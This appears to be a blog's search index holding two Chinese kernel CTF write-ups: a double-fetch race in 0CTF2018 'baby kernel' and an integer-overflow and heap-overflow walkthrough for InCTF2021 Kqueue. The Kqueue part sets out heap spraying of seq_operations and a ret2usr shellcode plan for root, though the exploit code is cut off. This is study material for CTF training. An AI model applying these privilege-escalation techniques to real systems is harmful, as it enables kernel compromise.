<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>0x07 kernel 条件竞争</title>
    <link href="/2022/11/20/0x07kernel%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89/"/>
    <url>/2022/11/20/0x07kernel%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89/</url>
    
    <content type="html"><![CDATA[<h2 id="前言">前言</h2><p>本篇是关于kernel pwn中的条件竞争，由于是我们在用户态编写程序与内核交互，所以我们可以启动多个线程同时运行，以达到条件竞争</p><h2 id="double-fetch">double fetch</h2><p>double fetch可以理解为两次或多次对同一个对象取值</p><p>例：内核对一个对象第一次取值进行合法性检测，第二次取值进行使用</p><p>我们可以在第一次取值后对值进行修改成恶意数据，在第二次使用时执行我们的恶意数据</p><blockquote><p>通过在 first fetch 与 second fetch 之间的空挡修改数据从而改变内核执行流的利用手法便被称之为<code>double fetch</code></p></blockquote><h3 id="0CTF2018-Final-baby-kernel">0CTF2018 Final-baby kernel</h3><p>几年前的题目就是亲切，现在题目都是什么妖魔鬼怪</p><h4 id="0x01程序分析">0x01程序分析</h4><p>而单进程的内核很难触发double fetch漏洞，因此需要在QEMU启动时设置好内核和进程数如</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">-m 256M -smp 2,<span class="hljs-attribute">cores</span>=2,threads=1  \<br></code></pre></td></tr></table></figure><p>保护什么都没开</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs shell">qemu-system-x86_64 \<br>-m 256M -smp 2,cores=2,threads=1  \<br>-kernel ./vmlinuz-4.15.0-22-generic \<br>-initrd  ./core.cpio \<br>-append &quot;root=/dev/ram rw console=ttyS0 oops=panic panic=1 quiet&quot; \<br>-cpu qemu64 \<br>-netdev user,id=t0, -device e1000,netdev=t0,id=nic0 \<br>-nographic  \<br></code></pre></td></tr></table></figure><p>载入了baby.ko驱动</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">#</span><span class="language-bash">!/bin/sh</span><br><br>mount -t proc none /proc<br>mount -t sysfs none /sys<br>mount -t devtmpfs devtmpfs /dev<br>echo &quot;flag&#123;this_is_a_sample_flag&#125;&quot; &gt; flag<br>chown root:root flag<br>chmod 400 flag<br>exec 0&lt;/dev/console<br>exec 1&gt;/dev/console<br>exec 2&gt;/dev/console<br><br>insmod baby.ko<br>chmod 777 /dev/baby<br>echo -e &quot;\nBoot took $(cut -d&#x27; &#x27; -f1 /proc/uptime) seconds\n&quot;<br>setsid cttyhack setuidgid 1000 sh<br><br>umount /proc<br>umount /sys<br>poweroff -d 0  -f<br></code></pre></td></tr></table></figure><p>baby.ko驱动里只定义了baby_ioctl，里面是这个函数</p><p><img src="/2022/11/20/0x07kernel%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89/1.png" alt="1"></p><p><strong>分析一下它做了啥：</strong></p><p>如果选项0x6666会告诉我们题目给的flag的地址</p><p>如果选项0x1337,一开始会有三个检查</p><p><strong>前两个检查</strong>用了<code>_chk_range_not_ok</code>函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//_chk_range_not_ok函数</span><br><span class="hljs-type">bool</span> __fastcall _chk_range_not_ok(__int64 a1, __int64 a2, <span class="hljs-type">unsigned</span> __int64 a3)<br>&#123;<br>  <span class="hljs-type">bool</span> v3; <span class="hljs-comment">// cf</span><br>  <span class="hljs-type">unsigned</span> __int64 v4; <span class="hljs-comment">// rdi</span><br><br>  v3 = __CFADD__(a2, a1);<br>  v4 = a2 + a1;<br>  <span class="hljs-keyword">return</span> v3 || a3 &lt; v4;<br>&#125;<br></code></pre></td></tr></table></figure><p>这里面的<code>__CFADD__</code>在ida的宏定义是</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-comment">// carry flag of addition (x+y)</span><br><span class="hljs-keyword">template</span>&lt;<span class="hljs-keyword">class</span> <span class="hljs-title class_">T</span>, <span class="hljs-keyword">class</span> <span class="hljs-title class_">U</span>&gt; int8 __CFADD__(T x, U y)<br>&#123;<br>  <span class="hljs-type">int</span> size = <span class="hljs-built_in">sizeof</span>(T) &gt; <span class="hljs-built_in">sizeof</span>(U) ? <span class="hljs-built_in">sizeof</span>(T) : <span class="hljs-built_in">sizeof</span>(U);<br>  <span class="hljs-keyword">if</span> ( size == <span class="hljs-number">1</span> )<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">uint8</span>(x) &gt; <span class="hljs-built_in">uint8</span>(x+y);<br>  <span class="hljs-keyword">if</span> ( size == <span class="hljs-number">2</span> )<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">uint16</span>(x) &gt; <span class="hljs-built_in">uint16</span>(x+y);<br>  <span class="hljs-keyword">if</span> ( size == <span class="hljs-number">4</span> )<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">uint32</span>(x) &gt; <span class="hljs-built_in">uint32</span>(x+y);<br>  <span class="hljs-keyword">return</span> <span class="hljs-built_in">uint64</span>(x) &gt; <span class="hljs-built_in">uint64</span>(x+y);<br>&#125;<br></code></pre></td></tr></table></figure><p>add 指令会影响 CF（产生进位/借位）和 OF（两数最高位相同，结果最高位改变）标志位，v3获得的就是两数相加的 CF 位，这里一般为0,所以可以不管这个</p><p>a3我们要输入的是结构，结构分析后发现是</p><p>也就是存flag_str的指针，和flag的长度</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span>&#123;</span><br><span class="hljs-type">char</span> * flag_str<br><span class="hljs-type">int</span> flag_len<br>&#125;<br></code></pre></td></tr></table></figure><p>总的来讲</p><p><strong>第一个检查</strong>判断我们输入的结构体是否在用户空间</p><p><strong>第二个检查</strong>判断我们输入的flag_str是否在用户空间</p><p><strong>第三个检查</strong>判断我们输入的flag_str的len是否等于题目给的flag的长度</p><p>所有检查通过后对逐个字符与题目给的flag进行比较，都比较成功了的话打印题目的flag</p><h4 id="0x02解法1：条件竞争">0x02解法1：条件竞争</h4><h4 id="0x03解法2：测信道攻击">0x03解法2：测信道攻击</h4>]]></content>
    
    
    <categories>
      
      <category>kernel pwn</category>
      
    </categories>
    
    
    <tags>
      
      <tag>kernel heap overflow</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>0x06 kernel heap-Heap OverFlow</title>
    <link href="/2022/11/19/0x06kernelheapoverflow/"/>
    <url>/2022/11/19/0x06kernelheapoverflow/</url>
    
    <content type="html"><![CDATA[<h2 id="前言">前言</h2><p>参考<a href="https://arttnba3.cn/2021/03/03/PWN-0X00-LINUX-KERNEL-PWN-PART-I/#0x05-Kernel-Heap-Heap-Overflow">arttnba3</a>，<a href="https://bbs.pediy.com/thread-269031.htm">Roland</a> 本篇为内核的堆溢出</p><h2 id="InCTF2021-Kqueue">InCTF2021 - Kqueue</h2><p>解压打包要在root下进行，不然可能遇到各种奇怪的权限问题</p><h3 id="0x01程序分析">0x01程序分析</h3><p>只装载了这个LKM，按套路漏洞就在这里面</p><p><img src="/2022/11/19/0x06kernelheapoverflow/1.png" alt="1"></p><h4 id="1-保护">1.保护</h4><p>开启了kaslr，没开启smep/smap,KPTI</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs shell">stty sane<br>exec qemu-system-x86_64 \<br>    -cpu kvm64 \<br>    -m 512 \<br>    -nographic \<br>    -kernel &quot;bzImage&quot; \<br>    -append &quot;console=ttyS0 oops=panic panic=-1 pti=off kaslr quiet&quot; \<br>    -monitor /dev/null \<br>    -initrd &quot;./rootfs.cpio&quot; \<br>    -s<br></code></pre></td></tr></table></figure><h4 id="2-源码">2.源码</h4><p>程序实现了在内核态的队列管理，数据结构学的稀烂，看麻了</p><h5 id="一-结构体">一.结构体</h5><p>定义了管理结构queue</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span>&#123;</span><br>  <span class="hljs-type">uint16_t</span> data_size; <span class="hljs-comment">//每个queue_entry成员的大小</span><br>  <span class="hljs-type">uint64_t</span> queue_size; <span class="hljs-comment">//一个队列总大小</span><br>  <span class="hljs-type">uint32_t</span> max_entries;<span class="hljs-comment">//queue_entry的最大数量</span><br>  <span class="hljs-type">uint16_t</span> idx;<br>  <span class="hljs-type">char</span>* data;<br>&#125;<span class="hljs-built_in">queue</span>;<br></code></pre></td></tr></table></figure><p>kqueues数组，也就是最多5个队列</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-built_in">queue</span> *kqueues[MAX_QUEUES] = &#123;(<span class="hljs-built_in">queue</span> *)<span class="hljs-literal">NULL</span>&#125;;<br></code></pre></td></tr></table></figure><p>定义成员结构queue_entry</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c">queue_entry *kqueue_entry;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">queue_entry</span>&#123;</span><br>  <span class="hljs-type">uint16_t</span> idx;<span class="hljs-comment">//entry的下标</span><br>  <span class="hljs-type">char</span> *data;<span class="hljs-comment">//当前entry维护的数据</span><br>  queue_entry *next; <span class="hljs-comment">//next指针,就是链表嘛</span><br>&#125;;<br></code></pre></td></tr></table></figure><h5 id="二-create-kqueue">二.create_kqueue</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> noinline <span class="hljs-type">long</span> <span class="hljs-title function_">create_kqueue</span><span class="hljs-params">(<span class="hljs-type">request_t</span> request)</span>&#123;<br>    <span class="hljs-type">long</span> result = INVALID;<br><span class="hljs-comment">//队列数量不能大于5</span><br>    <span class="hljs-keyword">if</span>(queueCount &gt; MAX_QUEUES)<br>        err(<span class="hljs-string">&quot;[-] Max queue count reached&quot;</span>);<br><span class="hljs-comment">//queue_entry最大数量不能为0</span><br>    <span class="hljs-keyword">if</span>(request.max_entries&lt;<span class="hljs-number">1</span>)<br>        err(<span class="hljs-string">&quot;[-] kqueue entries should be greater than 0&quot;</span>);<br><span class="hljs-comment">//queue_entry成员大小不能大于0x20</span><br>    <span class="hljs-keyword">if</span>(request.data_size&gt;MAX_DATA_SIZE)<br>        err(<span class="hljs-string">&quot;[-] kqueue data size exceed&quot;</span>);<br>    queue_entry *kqueue_entry;<br><span class="hljs-comment">//下面两个检查就是判断有无整数溢出</span><br>    ull space = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">if</span>(__builtin_umulll_overflow(<span class="hljs-keyword">sizeof</span>(queue_entry),(request.max_entries+<span class="hljs-number">1</span>),&amp;space) == <span class="hljs-literal">true</span>)<br>        err(<span class="hljs-string">&quot;[-] Integer overflow&quot;</span>);<br>    ull queue_size = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">if</span>(__builtin_saddll_overflow(<span class="hljs-keyword">sizeof</span>(<span class="hljs-built_in">queue</span>),space,&amp;queue_size) == <span class="hljs-literal">true</span>)<br>        err(<span class="hljs-string">&quot;[-] Integer overflow&quot;</span>);<br><span class="hljs-comment">//一个队列总大小不能过0x10000</span><br>    <span class="hljs-keyword">if</span>(queue_size&gt;<span class="hljs-keyword">sizeof</span>(<span class="hljs-built_in">queue</span>) + <span class="hljs-number">0x10000</span>)<br>        err(<span class="hljs-string">&quot;[-] Max kqueue alloc limit reached&quot;</span>);<br><br> <span class="hljs-comment">//所有检查完毕，开始分配内存</span><br>    <span class="hljs-built_in">queue</span> *<span class="hljs-built_in">queue</span> = validate((<span class="hljs-type">char</span> *)kmalloc(queue_size,GFP_KERNEL));<br>    <span class="hljs-built_in">queue</span>-&gt;data = validate((<span class="hljs-type">char</span> *)kmalloc(request.data_size,GFP_KERNEL));<br>    <span class="hljs-built_in">queue</span>-&gt;data_size   = request.data_size;<br>    <span class="hljs-built_in">queue</span>-&gt;max_entries = request.max_entries;<br>    <span class="hljs-built_in">queue</span>-&gt;queue_size  = queue_size;<br>    kqueue_entry = (queue_entry *)((<span class="hljs-type">uint64_t</span>)(<span class="hljs-built_in">queue</span> + (<span class="hljs-keyword">sizeof</span>(<span class="hljs-built_in">queue</span>)+<span class="hljs-number">1</span>)/<span class="hljs-number">8</span>));<br>    queue_entry* current_entry = kqueue_entry;<br>    queue_entry* prev_entry = current_entry;<br>    <span class="hljs-type">uint32_t</span> i=<span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">for</span>(i=<span class="hljs-number">1</span>;i&lt;request.max_entries+<span class="hljs-number">1</span>;i++)&#123;<br>        <span class="hljs-keyword">if</span>(i!=request.max_entries)<br>            prev_entry-&gt;next = <span class="hljs-literal">NULL</span>;<br>        current_entry-&gt;idx = i;<br>        current_entry-&gt;data = (<span class="hljs-type">char</span> *)(validate((<span class="hljs-type">char</span> *)kmalloc(request.data_size,GFP_KERNEL)));<br>        current_entry += <span class="hljs-keyword">sizeof</span>(queue_entry)/<span class="hljs-number">16</span>;<br>        prev_entry-&gt;next = current_entry;<br>        prev_entry = prev_entry-&gt;next;<br>    &#125;<br><span class="hljs-comment">//遍历查找数组里有无空余的</span><br>    <span class="hljs-type">uint32_t</span> j = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">for</span>(j=<span class="hljs-number">0</span>;j&lt;MAX_QUEUES;j++)&#123;<br>        <span class="hljs-keyword">if</span>(kqueues[j] == <span class="hljs-literal">NULL</span>)<br>            <span class="hljs-keyword">break</span>;<br>    &#125;<br><span class="hljs-comment">//这里循环完j=5，不会执行if语句，我们能越界多分配一个队列</span><br>    <span class="hljs-keyword">if</span>(j&gt;MAX_QUEUES)<br>        err(<span class="hljs-string">&quot;[-] No kqueue slot left&quot;</span>);<br>    <span class="hljs-comment">/* Assign the newly created kqueue to the kqueues */</span><br>    kqueues[j] = <span class="hljs-built_in">queue</span>;<br>    queueCount++;<br>    result = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">return</span> result;<br>&#125;<br></code></pre></td></tr></table></figure><p>程序用gcc内置函数<code>__builtin_umulll_overflow</code>检测乘法溢出</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c">ull space = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">if</span>(__builtin_umulll_overflow(<span class="hljs-keyword">sizeof</span>(queue_entry),(request.max_entries+<span class="hljs-number">1</span>),&amp;space) == <span class="hljs-literal">true</span>)<br>        err(<span class="hljs-string">&quot;[-] Integer overflow&quot;</span>);<br></code></pre></td></tr></table></figure><p>检测<code>sizeof(queue_entry)</code>与<code>(request.max_entries+1)</code>相乘是否溢出,</p><p>但是<code>request.max_entries</code>本身没有溢出检测</p><p>在request_t结构的定义里它是32位无符号整型</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span>&#123;</span><br>  <span class="hljs-type">uint32_t</span> max_entries;<br>  <span class="hljs-type">uint16_t</span> data_size;<br>  <span class="hljs-type">uint16_t</span> entry_idx;<br>  <span class="hljs-type">uint16_t</span> queue_idx;<br>  <span class="hljs-type">char</span>* data;<br>&#125;<span class="hljs-type">request_t</span>;<br></code></pre></td></tr></table></figure><p><strong>存在整型溢出漏洞</strong>，如果我们输入一个极大值<code>0xffffffff</code>，那么加1后发生溢出，发生溢出变为0，从而通过了乘法检测，</p><p>所以<code>request.max_entries</code>可以是0xffffffff这个极大值</p><p>下一个检测<code>__builtin_saddll_overflow</code>因为space=0</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">if</span>(__builtin_saddll_overflow(<span class="hljs-keyword">sizeof</span>(<span class="hljs-built_in">queue</span>),space,&amp;queue_size) == <span class="hljs-literal">true</span>)<br>        err(<span class="hljs-string">&quot;[-] Integer overflow&quot;</span>);<br></code></pre></td></tr></table></figure><p>所以queue_size=sizeof(queue)</p><p>值得一题的是因为<code>request.max_entries+1=0</code>，所以也没有进入循环，所以没有分配任何一个queue_entry成员</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">for</span><span class="hljs-params">(i=<span class="hljs-number">1</span>;i&lt;request.max_entries+<span class="hljs-number">1</span>;i++)</span></span>&#123;<br>.....<br>&#125;<br></code></pre></td></tr></table></figure><h5 id="三-save-kqueue-entries">三.save_kqueue_entries</h5><p>这里存在<strong>堆溢出漏洞</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> noinline <span class="hljs-type">long</span> <span class="hljs-title function_">save_kqueue_entries</span><span class="hljs-params">(<span class="hljs-type">request_t</span> request)</span>&#123;<br><span class="hljs-comment">//各种检查</span><br>    <span class="hljs-keyword">if</span>(request.queue_idx &gt; MAX_QUEUES)<br>        err(<span class="hljs-string">&quot;[-] Invalid kqueue idx&quot;</span>);<br>    <span class="hljs-keyword">if</span>(isSaved[request.queue_idx]==<span class="hljs-literal">true</span>)<br>        err(<span class="hljs-string">&quot;[-] Queue already saved&quot;</span>);<br>    <span class="hljs-built_in">queue</span> *<span class="hljs-built_in">queue</span> = validate(kqueues[request.queue_idx]);<br>    <span class="hljs-keyword">if</span>(request.max_entries &lt; <span class="hljs-number">1</span> || request.max_entries &gt; <span class="hljs-built_in">queue</span>-&gt;max_entries)<br>        err(<span class="hljs-string">&quot;[-] Invalid entry count&quot;</span>);<br><span class="hljs-comment">//为需要保存的队列分配内存，由于我们的构造，这里只分配给new_queue一个小内存</span><br>    <span class="hljs-type">char</span> *new_queue = validate((<span class="hljs-type">char</span> *)kzalloc(<span class="hljs-built_in">queue</span>-&gt;queue_size,GFP_KERNEL));<br>    <span class="hljs-keyword">if</span>(request.data_size &gt; <span class="hljs-built_in">queue</span>-&gt;queue_size)<br>        err(<span class="hljs-string">&quot;[-] Entry size limit exceed&quot;</span>);<br><br><span class="hljs-comment">//拷贝到new_queue内存queue-&gt;data数据，长度是我们另定的request.data_size，所以存在溢出</span><br>    <span class="hljs-keyword">if</span>(<span class="hljs-built_in">queue</span>-&gt;data &amp;&amp; request.data_size)<br>        validate(<span class="hljs-built_in">memcpy</span>(new_queue,<span class="hljs-built_in">queue</span>-&gt;data,request.data_size));<br>    <span class="hljs-keyword">else</span><br>        err(<span class="hljs-string">&quot;[-] Internal error&quot;</span>);<br>    new_queue += <span class="hljs-built_in">queue</span>-&gt;data_size;<br><br>    <span class="hljs-comment">/* Get to the entries of the kqueue */</span><br>    queue_entry *kqueue_entry = (queue_entry *)(<span class="hljs-built_in">queue</span> + (<span class="hljs-keyword">sizeof</span>(<span class="hljs-built_in">queue</span>)+<span class="hljs-number">1</span>)/<span class="hljs-number">8</span>);<br><br><span class="hljs-comment">//如果我们按前面0xffffffff设置的话,拷贝循环是没进入的。这里的作用是拷贝kqueue_entry-&gt;data数据，长度也是我们自己定的request.data_size</span><br>    <span class="hljs-type">uint32_t</span> i=<span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">for</span>(i=<span class="hljs-number">1</span>;i&lt;request.max_entries+<span class="hljs-number">1</span>;i++)&#123;<br>        <span class="hljs-keyword">if</span>(!kqueue_entry || !kqueue_entry-&gt;data)<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">if</span>(kqueue_entry-&gt;data &amp;&amp; request.data_size)<br>            validate(<span class="hljs-built_in">memcpy</span>(new_queue,kqueue_entry-&gt;data,request.data_size));<br>        <span class="hljs-keyword">else</span><br>            err(<span class="hljs-string">&quot;[-] Internal error&quot;</span>);<br>        kqueue_entry = kqueue_entry-&gt;next;<br>        new_queue += <span class="hljs-built_in">queue</span>-&gt;data_size;<br>    &#125;<br><br>    <span class="hljs-comment">/* Mark the queue as saved */</span><br>    isSaved[request.queue_idx] = <span class="hljs-literal">true</span>;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h5 id="四-err">四.err</h5><p>呃，其实这里err就printk一下，没有实质性作用，所以其实<strong>所有检测都是没用的</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">long</span> <span class="hljs-title function_">err</span><span class="hljs-params">(<span class="hljs-type">char</span>* msg)</span>&#123;<br>  printk(KERN_ALERT <span class="hljs-string">&quot;%s\n&quot;</span>,msg);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="0x02漏洞利用">0x02漏洞利用</h3><h4 id="1-整型溢出">1.整型溢出</h4><p>因为32位的无符号整型<code>request.max_entries=0xffffffff+1=0</code>存在溢出，我们传入</p><p><code>0xffffffff</code>使其只分配一个 queue 和一个 data 而不分配 queue_entry的同时使得</p><p><code>queue-&gt;max_entries = 0xffffffff</code>，此时我们的 queue-&gt;queue_size 便为 0x18</p><h4 id="2-堆溢出-seq-operations结构体">2.堆溢出+seq-operations结构体</h4><p>如果填入0xffffffff的话在 save_kqueue_entries()中会分配0x18大小的object给queue-&gt;queue_size，内存会从<code>kmalloc-32</code>中取，选取一个同样从kmalloc-32中分配的结构体，可以是 <strong>seq-operations</strong>,当我们打开stat文件（可以为/proc/self/stat）会在内核空间分配一个<strong>seq-operations</strong>结构体</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">seq_operations</span> &#123;</span><br>    <span class="hljs-type">void</span> * (*start) (<span class="hljs-keyword">struct</span> seq_file *m, <span class="hljs-type">loff_t</span> *pos);<br>    <span class="hljs-type">void</span> (*stop) (<span class="hljs-keyword">struct</span> seq_file *m, <span class="hljs-type">void</span> *v);<br>    <span class="hljs-type">void</span> * (*next) (<span class="hljs-keyword">struct</span> seq_file *m, <span class="hljs-type">void</span> *v, <span class="hljs-type">loff_t</span> *pos);<br>    <span class="hljs-type">int</span> (*show) (<span class="hljs-keyword">struct</span> seq_file *m, <span class="hljs-type">void</span> *v);<br>&#125;;<br></code></pre></td></tr></table></figure><p>当我们read这个stat文件会调用proc_ops 的 <code>proc_read_iter</code> 指针，其默认值为 <code>seq_read_iter()</code> 函数，就会调用start函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">ssize_t</span> <span class="hljs-title function_">seq_read_iter</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> kiocb *iocb, <span class="hljs-keyword">struct</span> iov_iter *iter)</span><br>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">seq_file</span> *<span class="hljs-title">m</span> =</span> iocb-&gt;ki_filp-&gt;private_data;<br>    <span class="hljs-comment">//...</span><br>    p = m-&gt;op-&gt;start(m, &amp;m-&gt;index);<br>    <span class="hljs-comment">//...</span><br></code></pre></td></tr></table></figure><p>所以我们要控制<strong>seq_operations-&gt;start</strong>指向我们的shllocde，在用read读取对应的stat文件触发即可</p><h4 id="3-堆喷射">3.堆喷射</h4><p><strong>堆喷射（heap spray）</strong>，多次分配相同的内存以确保我们能命中其中之一</p><p>在这题中我们要在内核空间喷射足够多的<code>seq_operations</code> 结构体</p><h4 id="4-ret2usr-ret2shellcode">4.ret2usr+ret2shellcode</h4><p>没开smep/smap,KPTI,本题可使用ret2usr,<strong>但是由于开启了kalsr，我们似乎并无法找到prepare_kernel_cred 和 commit_creds 的地址</strong></p><p>但是可以通过编写shellcode利用内核栈上的数据来获得内核基址去执行commit_creds(prepare_kernel_cred(NULL))，着陆回用户态</p><h3 id="0x03-Exploit">0x03 Exploit</h3><p><strong>分析一下这个exp：</strong></p><p>首先保存一下用户态的寄存器值，为后续返回用户态准备</p><p>接着打开/dev/kqueue这个设备，与kqueue.ko这个驱动来交互</p><p>create_kqueue我们定<code>request.max_entries=0xffffffff</code>，大小定为0x20个存shellcode的指针</p><p>edit_kqueue我们写入这0x20个shellcode的指针</p><p>我们堆喷射大量<code>seq_operations</code> 结构体，这里open了0x200次<code>/proc/self/stat</code>这个结构体</p><p>用save_kqueue变更长度从0x18-&gt;0x40,溢出了0x28，也就是5个shellcode指针到了内存外，我们堆喷后，大概率是为<code>seq_operations</code> 结构体分配的内存，我们覆盖了start指针为shellcode的指针</p><p>我们一次用read来触发，调用start指针，执行我们的shellcode</p><p><strong>shellcode功能：</strong></p><p>取栈上存的内核符号的地址，得出基址，rop出commit_creds(prepare_kernel_cred(NULL))，返回用户态，生成shell</p><p>（主要是如何调试出来要减的值，我先在还不太会。）</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span 